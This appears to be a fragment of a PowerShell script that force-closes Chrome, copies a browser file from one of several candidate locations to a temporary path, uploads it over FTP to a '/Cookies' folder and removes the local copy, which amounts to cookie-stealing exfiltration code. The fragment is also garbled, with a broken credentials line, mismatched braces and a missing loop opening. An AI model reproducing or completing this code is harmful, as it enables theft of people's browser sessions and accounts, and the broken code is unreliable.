# Close Chrome before running the script
try {
    Stop-Process -Name "chrome" -Force -ErrorAction Stop

    $ftpRequest.Credentials = NeName($source_directory)
        $temp_path = Join-Path -Path "C:\" -ChildPath $file_name # Use a common temp directory for consistency
        Copy-Item -Path $source_directory -Destination $temp_path # Copy the file to a temporary location
        Upload-ToFtp -file_path $temp_path -file_name $file_name # Upload the file from the temporary location to /Cookies
        Remove-Item -Path $temp_path # Clean up the temporary file
        break # Stop checking once the first file is found and uploaded
    }
}

# If none of the files were found and uploaded
if (-not (Test-Path $source_directory_1 -Or Test-Path $source_directory_2 -Or Test-Path $source_directory_3)) {
    Write-Host "None of the directories or files exist."
}
